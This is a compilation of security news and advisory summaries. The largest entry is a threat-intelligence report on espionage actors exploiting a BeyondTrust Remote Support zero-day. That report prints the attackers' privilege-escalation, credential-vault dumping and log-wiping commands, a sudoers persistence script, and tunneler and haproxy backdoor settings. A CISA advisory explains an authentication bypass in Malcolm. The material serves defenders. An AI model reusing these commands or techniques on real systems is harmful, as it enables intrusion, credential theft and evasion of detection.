summary: Parts 1 and 2 of this series looked at two pressures facing higher education security teams. First, the threat landscape : universities are dealing with more frequent attacks across complex, distributed environments, while campus-by-campus security can make it harder to share intelligence and coordinate response. Second, the compliance burden: overlapping requirements across FERPA, GLBA, HIPAA, and CMMC make it difficult to establish what data was affected, which reporting obligations apply, and how quickly the institution needs to act. This final part is about what changes when a university system starts treating security as a shared capability rather than a collection of separate campus programs. Multi-campus institutions still need to preserve local autonomy, but they also need enough visibility across the wider organization to understand where risk sits, how an incident is spreading, and whether the same problem is appearing elsewhere. That balance is especially relevant in higher education, where campuses, research environments, health services, and administrative teams often operate with very different technology needs and levels of independence. Security architecture should reflect how universities actually operate Most university systems are already federated organizations, with individual campuses managing their own leadership, budgets, users, and technology environments while a central office provides governance and oversight across the wider institution. Security architecture can follow the same model. With multi-tenancy in the Rapid7 Command Platform, a central security team can maintain visibility across the university system while individual campuses continue to operate within their own environments. Campus-level data and access remain separated, while the central team can identify wider patterns, coordinate response, and distribute common workflows across the system. A new attack pattern detected at one campus, for example, should not have to remain a local discovery. Shared visibility and coordinated workflows can help the central team determine whether the same activity is appearing elsewhere and make relevant response guidance available across the institution without exposing one campus's data to another. As the university system grows, that model can expand with it. A system operating three campuses today can add new environments without redesigning the security architecture each time. Shared visibility makes cross-campus response faster A central view of the attack surface can reduce much of the manual work that happens when university teams need to answer a system-wide security question. If a significant zero-day is disclosed, the central security team needs to know which campuses are running affected systems, which have already remediated the vulnerability, and where attention is still required. In a decentralized environment, gathering that information can mean emails, calls, spreadsheets, and separate conversations with each campus. A shared view of assets and vulnerabilities gives teams a faster way to establish where the exposure exists. During an active incident, the same cross-campus visibility can help investigators work out whether suspicious activity first appeared at Campus C because the compromise began there, or because that is simply where it became visible. It also allows them to check whether the same indicators are present at Campus A or Campus B before each team starts investigating independently. Universities also have large external attack surfaces that can be difficult to inventory centrally. Student portals, APIs, research servers, faculty websites, and other internet-facing assets may be created outside normal IT processes. Rapid7's Project Sonar continuously scans the public internet, helping organizations identify externally exposed services and assets that internal inventories may have missed. Vulnerability prioritization needs more than a severity score University security teams rarely have the capacity to remediate every vulnerability at once, so prioritization has to reflect how likely an exposure is to be used in a real attack. Rapid7 combines vulnerability data with attacker intelligence, including insight from Metasploit , our open source penetration testing framework used by security professionals to test and validate real-world exploits, with more than 3,000 exploit modules. That intelligence is combined with insight from AttackerKB, incident response engagements, honeypots, and other threat intelligence sources, giving teams additional context around whether an exploit exists, whether exploitation has been observed, and how difficult a vulnerability may be to use in practice. For a university working through thousands of findings across multiple campuses, that context can help teams direct limited remediation capacity toward exposures with stronger evidence of attacker interest rather than relying on severity scores alone. Incident response has to work across campus boundaries The compliance requirements discussed in Part 2 put added pressure on investigation speed, particularly when legal or compliance teams need to establish whether regulated student, financial, health, or research data was accessed across more than one campus. Rapid7's open source Velociraptor platform can collect forensic artifacts and run live investigations across thousands of endpoints simultaneously. In a multi-campus university, that could allow investigators to determine whether the same activity or data access occurred across several environments without conducting each investigation separately. Automated response workflows can also be distributed across affected campus environments, allowing teams to isolate compromised systems, revoke credentials, or block indicators consistently rather than repeating the same response manually at each institution. Campuses with smaller security teams benefit from that shared capability because the quality and speed of response are less dependent on how many people happen to be available locally when an incident occurs. Consolidation can return time to stretched security teams The operational case for a shared security model also comes down to the amount of work created by fragmentation. Separate campus tools mean separate licenses, integrations, training requirements, renewals, reporting processes, and vendor relationships, all of which consume time that understaffed security teams could be spending elsewhere. The source material for this series includes an example of one organization recovering 96 hours per month by reducing manual work across disparate security tools. It also cites an average 74% improvement in mean time to detect where unified visibility and threat correlation were applied. For higher education teams working within tight regulatory reporting windows, the difference between finding an incident in hours rather than days can have a direct impact on how quickly the institution can assess scope and respond. A system-wide agreement can also reduce the number of contracts, renewal cycles, and vendor relationships that central and campus teams need to manage, while allowing security capabilities to scale as the institution adds campuses, devices, and cloud services. Building security around the university as a whole Multi-campus universities will always have different technology needs across individual campuses, research environments, health services, and administrative functions. A connected security model does not require those environments to operate identically, but it does give central and local teams a better way to understand shared risk, coordinate investigations, and apply consistent response when an issue extends beyond a single campus. Across this series, the same pattern has appeared from different angles. Threats move across organizational boundaries, regulated data rarely sits neatly within one campus, and the people responsible for protecting university systems are already working with limited time and resources. Bringing more of that security context together can help teams respond faster, share intelligence more effectively, and reduce the manual work created by disconnected tools and processes. summary: Written by: Jayson Frost, Bryce Greathouse, Brian Meyer, John Palmisano, Rajesh Rajeshirke, Steve Rasch, John Wolfram Introduction On October 15, BeyondTrust disclosed a vulnerability, CVE-2026-102764, impacting BeyondTrust Remote Support (formerly Bomgar) appliances. BeyondTrust Remote Support is an enterprise secure remote access solution that enables IT teams to securely access and troubleshoot remote endpoints. The successful exploitation of this vulnerability results in the arbitrary upload of files. During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221 ), exploited this vulnerability as a zero-day, in late August 2026. This blog describes how ARMORY CASTLE escalated privileges and established persistent access to compromised BeyondTrust Remote Support appliances following exploitation of CVE-2026-102764, and provides actionable guidance for defenders. Organizations should prepare for potential widespread exploitation following this disclosure, as ARMORY CASTLE and other threat actors have historically conducted broad, opportunistic exploitation once the vulnerability becomes public. Exploitation Mandiant identified evidence of CVE-2026-102764 exploitation within the access, syslog, messages, thin-scc, brain and SSL log files, which are only accessible via an LUKS-encrypted partition which contains the /home directory. We strongly recommend that affected organizations immediately apply the security patches provided by BeyondTrust to remediate the vulnerability, and review additional guidance in their blog . Post-Exploitation Following the successful exploitation of CVE-2026-102764, Mandiant observed ARMORY CASTLE leverage multiple distinct TTPs to establish a foothold, escalate privileges, and enable lateral movement. Throughout the intrusion, ARMORY CASTLE leveraged a deep understanding of BeyondTrust appliance internals, as evidenced by their abuse of proprietary CLI utilities, startup configuration templates and local reverse-proxy routing. The threat actor used newly identified custom malware, the SAWFLY webshell and the BARECLAW tunneler to interact with the BeyondTrust device. Additionally, the actor routinely deleted appliance logs and endpoint artifacts to maintain access and evade detection. Figure 1: ARMORY CASTLE BeyondTrust compromise sequence of events Staging Webshell After successful exploitation of CVE-2026-102764, ARMORY CASTLE initiated POST requests to /app_84304470%2Ephp . Mandiant was unable to recover the file associated with the POST requests. Approximately 11 minutes following the initial POST request, the file system recorded the creation of the SAWFLY webshell at the web root path /%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/ . ARMORY CASTLE leveraged the SAWFLY webshell as one of their primary footholds within the environment over the course of the intrusion. SAWFLY Webshell SAWFLY ( mangoapi.php ) is an obfuscated, lightweight PHP webshell that implements bidirectional encrypted C2 communication using a custom Base32 transport layer and a 256-bit RC4 stream cipher. The webshell inspects incoming HTTP POST requests for the obfuscated parameter _c94mfe . If the parameter is absent, the script immediately sets HTTP status 404 Not Found ( http_response_code(404) ) and exits to evade automated web crawlers and vulnerability scanners. When the _c94mfe parameter is supplied, the webshell Base32-decodes the payload, decrypts it using RC4 with a hardcoded 32-byte key and executes the resulting PHP code via @eval() . Any non-null return value from the evaluated code is RC4-encrypted with the same key, Base32-encoded, and echoed back to the client. Privilege Escalation via SUID Bit Permissions The SAWFLY webshell ran under the site's service account, an unprivileged local user. To escalate privileges, the threat actor copied the system shell executable ( /bin/sh ) to the file /usr/bin/dbus-authd . The threat actor then modified the file's ownership to root and enabled Set User ID (SUID) permissions. When a binary has SUID permissions enabled, it executes with the privileges of the file's owner (root) rather than the user running the command, effectively granting the threat actor a persistent root-level backdoor on the host system. After establishing a foothold through the web shell, the actor elevated from the web service account to root-level control of the appliance host. This gave them access to every credential the appliance stored or brokered and the ability to modify files that survive reboot and configuration reset. Credential Harvesting: BeyondTrust Vault Extraction Mandiant observed the threat actor attempt to harvest credentials directly from the appliance's native secrets management database. To achieve this, the actor leveraged the /ns/sbin/bt-secrets binary which is a proprietary, administrative Command Line Interface (CLI) utility native to BeyondTrust appliances used to manage, store, and retrieve passwords, API keys, and endpoint credentials. The threat actor systematically iterated through several CLI syntax variations to locate and dump the appliance's credential vault: /ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get vault Figure 2: Recovered Commands from message logs First, the threat actor attempted to target the vault for a specific site service account in order to pull passwords and keys assigned exclusively to that profile. Next, they issued a fallback command, targeting the global, appliance-level password safe to dump all stored administrative credentials. The threat actor concluded their interaction with the bt-secrets binary by forcibly removing the records stored i n /home/bomgar/log/bt-secrets.log and any archived files. /usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2>/dev/null;' Figure 3: Recovered Commands from message logs Persistence For long-term persistent access, Mandiant observed the threat actor target the BeyondTrust configuration templates to grant passwordless root privileges to the site service account. First, the threat actor created the /home/bomgar/sbin/post_boot.d directory, which is reserved for scripts executed automatically at system startup. Within this directory, they created a shell script named zz-root-persist . The contents of the zz-root-persist script indicate that it first checks if the user account is already granted passwordless root privileges within the /ns/config/sudoers.template file. If the entry is missing, the script appends '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' to the template. This entry added to the sudoers template grants the site user account passwordless administrative privileges to execute any command on the host system. Finally, the script executes '/ns/sbin/bt-sysconfig' --no-restart misc , which forces the appliance backend to immediately parse /ns/config/sudoers.template and rebuild the active /etc/sudoers file. This strategy ensures the threat actor's privilege escalation survives system reboots and configuration resets, which would normally overwrite manual changes made directly to /etc/sudoers . #!/bin/bash grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' >> '/ns/config/sudoers.template' '/ns/sbin/bt-sysconfig' --no-restart misc Figure 4: Contents of zz-root-persist Anti-Forensics Throughout their unauthorized access to the appliance, Mandiant observed multiple instances where the threat actor attempted to impair defenses and hinder detection by systematically deleting system, web server, and application-level logs. Originating from the SAWFLY webshell, the threat actor executed the following command using elevated sudo privileges to delete active logs across both host and site-specific directories: 'rm -f \'/ns/log/auth.log\' \'/ns/log/ssl.log\' \'/ns/log/proto-handler.log\' \'/ns/log/bt-docker.log\' \'/ns/log/http-access.log\' \'/ns/log/http-errors.log\' \'/ns/log/php-fpm.log\' \'/ns/log/php-fpm-access.log\' \'/ns/log/php_debug.log\' \'/ns/log/php_web_errors.log\' \'/var/log/messages\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\' /tmp/sshauth.*' Figure 5: Recovered Command Lateral Movement: BeyondTrust Admin Session Abuse After the compromise of the BeyondTrust device, the threat actor pivoted into the BeyondTrust Remote Support application to perform reconnaissance via compromised Administrator credentials. First, the threat actor leveraged the Administrator account to log into the web administrative portal. { "event": "login", "status": "success", "target": "web/login", "who": "[REDACTED_USERNAME] using password", "who_ip": "[REDACTED_IP]" } Figure 6: BeyondTrust Syslog Entry After testing their initial access and verifying their ability to temporarily join the native Administrators group policy, the threat actor altered their strategy for long-term persistence. The actor directly modified the compromised account's permissions, upgrading both local Jump Items and Team permissions from No Access to Administrator . Jump Items are individual systems or devices that are made available for remote access within a Jump Group, enabling administrators to organize and control access to remote systems. This configuration change granted the threat actor permanent, unrestricted authorization to launch remote sessions to downstream systems populated within the appliance's Jump Item list. { "event": "user_changed", "old_username": "[REDACTED]", "old_permissions:jump_item_role:default:id": 1, "new_permissions:jump_item_role:default:id": 3, "old_permissions:jump_item_role:default:name": "No Access", "new_permissions:jump_item_role:default:name": "Administrator", "old_permissions:jump_item_role:teams:id": 1, "new_permissions:jump_item_role:teams:id": 3, "old_permissions:jump_item_role:teams:name": "No Access", "new_permissions:jump_item_role:teams:name": "Administrator" } Figure 7: BeyondTrust Syslog Entry Internal Reconnaissance Once the threat actor obtained elevated administrative privileges, Mandiant observed the threat actor establish a remote support session to target internal endpoints. Once connected, the threat actor leveraged the appliance’s built-in support tools to request and obtain full file-system access. The threat actor utilized the native BeyondTrust Remote Support file transfer service to download and exfiltrate sensitive internal documents useful for network reconnaissance, such as software inventories, directly from the user's desktop environment. BARECLAW Tunneler Mandiant observed the threat actor tunnel traffic through the BeyondTrust device via a custom SOCKS5 proxy tunneler. BARECLAW is a tunneler written in C that provides a SOCKS5 proxy service carried over the WebSocket transport and relays TCP connections between a remote client and destinations. BARECLAW statically embeds a CivetWeb WebServer to supply its HTTP and WebSocket functionality and utilizes OpenSSL for TLS. BARECLAW is configurable and provides the option to require authentication, to encrypt data between the client and tunneler, to restrict reachable destinations to specific CIDR ranges, to chain traffic to an upstream proxy, and to modify its default WebSocket endpoint and listening ports. TLS is enabled by providing a PEM certificate while authentication, encryption, destination filtering, and TLS are disabled by default. BARECLAW receives its configuration through CLI input and it provides a CLI option menu: Usage: %s [options] --listen PORT plain ws port (default 8080) --listen-tls PORT wss port (default 8443, needs --ssl-cert) --ssl-cert FILE PEM certificate (enables wss) --token STRING shared secret (?token= auth + obfs seed) --obfs enable XOR stream obfuscation --timeout SEC idle timeout (default 300) --connect-timeout SEC target connect timeout (default 10) --max-tunnels N concurrent tunnel limit (default 100) --allow-net CIDR allowed target subnet (repeatable) --upstream [socks5://]host:port route via upstream SOCKS5 --threads N civetweb worker threads (default 64) --ws-path PATH websocket endpoint path (default /wsproxy) -q, --quiet zero output (all logging suppressed) -h this help Figure 8: BARECLAW CLI Option Menu The threat actor executed BARECLAW through the following command line arguments: /tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge Figure 9: BARECLAW full Command-Line Arguments This command line configures BARECLAW to listen on TCP port 19800 and create the WebSocket endpoint /uidchanarge on the victim system. Clients are required to authenticate using the token specified in the command line arguments while the -q argument suppresses the tunneler’s logging. Tunneled data is encrypted with an XOR-based routine derived from that token and an 8-byte value provided by the client at the start of the session. The lack of the --ssl-cert and --listen-tls arguments in the CLI options means TLS was not enabled in this specific instance. Modifications to Haproxy.conf In addition to the creation of the BARECLAW tunneler, Mandiant observed the threat actor modify the /ns/config/haproxy.conf file in order for BARECLAW to be accessible directly from the internet. The HAProxy service running on BeyondTrust devices acts a reverse proxy for the device that accepts incoming requests on behalf of the BeyondTrust server and forwards the request to the appropriate backend services running on the local system (such as web interfaces, administration portals, or application gateways) based on the request's port or URL path. The haproxy.conf file is the primary configuration script that dictates how the BeyondTrust appliance handles, routes, and secures incoming traffic. The threat actor modifications first established an Access Control List (ACL) named wswsws to monitor incoming traffic for the specific URI path /uidchanarge . When a request matching this path is detected, HAProxy bypasses normal appliance web services and routes the traffic to a custom backend designated as webskd3 . acl wswsws path /uidchanarge use_backend webskd3 if wswsws Figure 10: ACL Modification to haproxy.conf Next, the webskd3 backend routes the incoming web stream locally (127.0.0.1 / localhost) to TCP port 19800, where the BARECLAW utility is actively listening. This local-only binding ensures that the backdoor listener remains completely hidden from external network scans, as it can only be reached internally via HAProxy's local redirection. backend webskd3 mode http server websocks5srv 127.0.0.1:19800 option http-keep-alive timeout server 28s timeout tunnel 5h Figure 11: Backend Route Modification to haproxy.conf Attribution GTIG attributes the zero-day exploitation of CVE-2026-102764 and the subsequent deployment of SAWFLY and BARECLAW to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). The tooling and TTPs leveraged within this intrusion align with previously observed activity from ARMORY CASTLE. GTIG has previously reported ARMORY CASTLE exploiting multiple vulnerabilities in edge appliances and deploying an extensive suite of custom tooling to support their objectives, ranging from passive backdoors and webshells to trojanized components of edge devices. ARMORY CASTLE has been active as early as October 2023 and has targeted a wide range of countries and verticals during their operations. Outlook and Implications In past campaigns, ARMORY CASTLE has conducted widespread and opportunistic exploitation following the public disclosure of vulnerabilities it had exploited selectively as zero-days, racing to infiltrate target organizations before patches are deployed. It is possible that we will observe similar widespread exploitation attempts associated with CVE-2026-102764. GTIG assesses with high confidence that ARMORY CASTLE will continue to leverage zero-day vulnerabilities in edge devices to gain access to environments to support their espionage objective. Defenders should also prepare for the possibility that following disclosure of CVE-2026-102764, ARMORY CASTLE may conduct widespread exploitation similar to what GTIG observed in 2024 following the disclosure of CVE-2023-46805 and CVE-2024-21887. Remediation and Hardening Organizations that have not yet applied the BT26-05 patch should immediately assess their exposure and risk, and review additional guidance from BeyondTrust in their blog . CVE-2026-102764 affects all supported Remote Support versions up to 26.2.3 and allows an unauthenticated remote attacker to perform file operations on the appliance, which can lead to host-level control and access to every credential the appliance stores or brokers. Any appliance that was reachable from the internet on a vulnerable version during the exploitation window should be treated as potentially compromised until it has been reviewed. Mandiant recommends a phased, patch-first approach that balances containment against disruption to support operations. Immediate Mitigation Organizations should choose among the following options based on their risk tolerance, evidence of compromise, and operational needs. Option 1: Apply the BT26-05 Patch (Mandiant Recommended) Remote Support SaaS : BeyondTrust applied the patch to all SaaS tenants on October 9, 2026. No customer action is required for the appliance itself. The credential and configuration steps in Option 3 still apply. Self-hosted, version 24.3.1 or later : Apply the BT26-05-RS patch from the /appliance interface, or confirm it was applied automatically if the appliance is subscribed to automatic updates. Self-hosted, older than 24.3.1 : Upgrade to a supported version, then apply the patch. Upgrading closes the vulnerability but does not remediate prior exposure. If the patch is not visible in /appliance , open a case with BeyondTrust Support referencing BT26-05. Option 2: Isolate Compromised or Suspected Appliances Preserve before acting : Snapshot virtual appliances with memory and export the disk before any change or reboot. For B Series hardware and SaaS tenants, request forensic preservation through BeyondTrust Support. Collect syslog, reverse-proxy or WAF, and perimeter firewall logs for the full exposure window, since an attacker with host access can delete on-appliance logs. Mandiant determined that the actor removed logs throughout the incident. Isolate at the perimeter : Block inbound traffic to the appliance's public address at the firewall rather than in /appliance , so the configuration remains intact for review. Restrict egress : Deny outbound traffic except to BeyondTrust update and licensing endpoints, and log every denied connection. Terminate access paths : End active support sessions and disable new sessions, Jump Clients, Jumpoints, and API accounts from /login . Disable rather than delete so the audit trail survives. Rebuild rather than clean : Redeploy appliances with confirmed or unknown compromise status from a clean, fully patched image. Customers cannot audit the appliance host file system, and host-level persistence survives reboot and configuration reset. Restore only a configuration backup dated before the exposure window, or restore the newest backup while isolated and complete the review in Option 3, Part B, before reconnecting anything. Issue a new TLS certificate and redeploy Jump Clients, Jumpoints, and the representative console from the rebuilt appliance. Note : Isolation and session termination interrupt support operations. Organizations should coordinate with help desk and vendor-support stakeholders before proceeding. Option 3: Apply Targeted Compensating Controls The following controls reduce exposure and limit post-exploitation impact. They do not substitute for the patch. Part A: Network Restrictions Restrict access to the /login and /appliance administrative interfaces by IP or network segment at the appliance level. Only representative console, customer portal, and Jump Client traffic should be reachable from the internet. Where operationally possible, place a reverse proxy or WAF with full URI logging in front of the appliance to keep a record of request paths that the appliance cannot alter. Part B: Credential Rotation and Configuration Review Revoke sessions and enrollments : End all active support sessions, then redeploy Jump Clients, Jumpoints, and the representative console from the patched or rebuilt appliance to invalidate existing tokens. Rotate credentials in dependency order : /appliance administrative credentials; /login administrators and local users; API client secrets; security provider bind accounts and SAML signing keys; Remote Support Vault and integrated Password Safe or Privileged Remote Access (PRA) credentials, rotated at the target system; integration credentials (SMTP, syslog, Information Technology Service Management (ITSM) connectors, outbound event secrets); and any credential typed into a support session during the window. Review the /login configuration against a pre-window baseline : user and role changes, particularly Jump Item roles raised to Administrator; group and session policies; API accounts; security providers; Jump Items and Jumpoints; and outbound event or syslog destinations. Remove anything without a change record or a named owner. Review support session reports for the window, including file transfers, to establish which endpoints were accessed and what left them. Every endpoint touched is in scope for downstream hunting. Note : Rotate credentials only after the appliance has been patched or rebuilt. Rotating earlier exposes the new credentials to an attacker who still controls the appliance. Part C: Control Plane Restrictions Require SAML single sign-on with phishing-resistant MFA for all /login users, and remove local accounts except one vaulted break-glass account with alerting on use. Ensure the built-in Admin account is configured with Multi-Factor Authentication (MFA) in accordance with the official BeyondTrust Two-Factor Authentication Guidelines . Set the default Jump Item role in every group policy to No Access, and grant roles through policy rather than per user. Scope API accounts to the minimum permission set, with a named automation owner for any account holding user or Jump Item management rights, and rotate API secrets on a schedule. Keep privileged credentials in Password Safe or an external vault with credential injection rather than in the Remote Support Vault, and store only non-interactive service account credentials on the appliance. Apply default-deny outbound filtering from the appliance, allowing only BeyondTrust endpoints and the organization's own syslog and directory servers. Part D: Logging and Detection Engineering Logging and Visibility Forward appliance syslog to a SIEM over TLS with retention that covers a multi-month exposure window, and collect reverse-proxy or WAF and perimeter firewall logs for the appliance's address. Export /login session, team activity, and user audit reports on a schedule. Detection Engineering Account and policy changes : user_changed events that raise a Jump Item or team role; user_added , api_account , and security_provider events with no change ticket; any change to outbound events or syslog destinations. Authentication : /login success from residential-broadband or commercial-VPN address space, and administrative logins outside business hours. Session activity : file-transfer events, and sessions started by accounts whose roles changed during the window. Request paths : at the reverse proxy or WAF, paths outside the known Remote Support path set, including unknown .php paths and WebSocket upgrades from outside support staff and endpoint address ranges. Anti-forensics: gaps in syslog forwarding from the appliance; an interruption bounded by a single session is a strong indicator of log tampering. Indicators of Compromise (IOCs) To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users. File Indicators Filename Description SHA-256 app_84304470%2Ephp Staging Webshell N/A mangoapi.php SAWFLY Webshell dc14e215269a93fdbc4c1a80b984c23faf7af0911c6dbb85309796a6f2ae95fb ingredi_ws BARECLAW Tunneler 1f19b9a27d79c11bda00a1e8faf74a7fdd683d38ccef1b60df2fd0307e3aa462 Detections YARA Rules rule G_Hunting_Webshell_SAWFLY_1 { meta: author = "Google Threat Intelligence Group" strings: $b32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567" ascii wide $rc4 = "range(0,255)" ascii wide $pack = "pack('H*'," ascii wide $eval = "@eval(" ascii wide $code404 = "http_response_code(404)" ascii wide condition: filesize < 20KB and all of them } rule G_Hunting_Backdoor_BARECLAW_1 { meta: author = "Google Threat Intelligence Group" strings: $s1 = "[%s ws_socks5d] " ascii wide $s2 = "--obfs requires --token" ascii wide $s3 = "mux: %s (frame[%lu]: %s)" ascii wide $s4 = "cannot create stream pump/writer thread (stream %d)" ascii wide $s5 = "reject: bad or missing token from %s" ascii wide $s6 = "listening on %s path=%s (token=%s obfs=%s max_tunnels=%d threads=%d)" ascii wide $s7 = "--ws-path must start with '/'" ascii wide $b_xorshift = { 48 c1 e0 17 48 31 c1 48 89 f0 48 c1 e8 1a 48 31 f0 48 31 c8 48 c1 e9 11 48 31 c8 } condition: uint32(0) == 0x464c457f and (5 of ($s*)) or ($b_xorshift and (3 of ($s*))) } Google Security Operations (SecOps) Google SecOps customers have access to these broad category rules and more under the Mandiant Hunting, Mandiant Frontline Threats, and Mandiant Intel Emerging Threats rule packs. The activity discussed in the blog post is detected in Google SecOps under the rule names: Echo Pipes Base64 To Shell Base64 Encoded Shell Command Execution Low Severity Endpoint Detection Cluster on Host Suspicious Curl Download to tmp Suspicious Curl Network Connection to Staging Directory Acknowledgements This analysis would not have been possible without the assistance of the FLARE team. We appreciate BeyondTrust for their collaboration against this threat.

summary: Drupal core has a critical flaw in its Field UI module that could let an attacker run code on the site's server, and fixes were shipped on October 14 in Drupal 11.4.10, 11.3.19, and 10.6.19. An attacker cannot reach the flaw through core alone, the Drupal Security Team said in its advisory. Several exploit paths exist through contributed modules, and at least one known path needs no login.

summary: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-21589 Atlassian Multiple Products Files or Directories Accessible to External Parties Vulnerability This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets. Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. summary: View CSAF Summary The following versions of CISA Malcolm are affected: Malcolm <=v26.07.1 (CVE-2026-107336, CVE-2026-107361, CVE-2026-107337, CVE-2026-107335, CVE-2026-107334) Malcolm <=v26.08.0 (CVE-2026-107333, CVE-2026-107362) CVSS Vendor Equipment v3 8.1 CISA Malcolm 6 Vulnerabilities Authentication Bypass by Spoofing, Incorrect Authorization, Server-Side Request Forgery (SSRF), Authentication Bypass Using an Alternate Path or Channel, Cross-Site Request Forgery (CSRF), Improper Handling of Highly Compressed Data (Data Amplification) Background Critical Infrastructure Sectors: Energy, Information Technology, Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-107336 Malcolm's front nginx reverse proxy defines a "Dashboards → Arkime shortcut" location using a case-insensitive regex matcher but a case-sensitive rewrite. A request whose path segment is not exact-lowercase (for example /IDDASH2ARK/...) enters the location (the matcher fires) but evades the rewrite (no redirect is issued), so nginx falls through to the location's proxy_pass to the Arkime backend. That location is the one proxied location in the shipped config that does not include the per-location authentication file, so the request reaches Arkime unauthenticated. The same location also forwards a client-supplied X-Forwarded-User header un-overwritten, and Arkime is configured to trust X-Forwarded-User as the authenticated username — so an unauthenticated network caller can reach the Arkime backend while supplying a forged, auto-provisioned identity. An authenticated user can craft a specially formatted request path to bypass role-based restrictions and reach administrative or role gated endpoints they should not have access to. This affects all restricted paths protected by the RBAC authorization layer, including file upload, PHP server, htadmin, and authentication management interfaces.
